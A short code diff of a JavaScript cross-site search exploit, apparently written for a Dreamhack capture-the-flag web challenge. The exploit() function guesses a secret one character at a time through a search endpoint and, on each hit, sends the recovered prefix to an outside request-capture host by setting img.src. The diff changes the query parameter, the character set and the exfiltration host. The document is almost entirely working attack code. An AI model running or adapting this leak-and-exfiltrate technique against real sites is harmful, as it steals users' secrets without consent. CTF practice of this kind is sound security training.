@@ -17,7 +17,7 @@
     async function search(query) {
         try {
             await req(
-              "http://127.0.0.1:8000/search?query=${query}"
+              "http://127.0.0.1:8000/search?q=${query}"
             );
             return true;
         } catch (e) {
@@ -26,14 +26,14 @@
     }
 
     async function exploit() {
-        let chars = "0123456789abcdef}"
-        let secret = "DH{";
+        let chars = "_abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789}"
+        let secret = "";
 
         while (!secret.includes("}")) {
             for (let c of chars) {
                 if (await search(secret + c)) {
                     secret += c;
-                    img.src = "https://apyoksz.request.dreamhack.games/?c=${secret}";
+                    img.src = "https://ufhluaw.request.dreamhack.games/?c=${secret}";
                     break;
                 }
             }
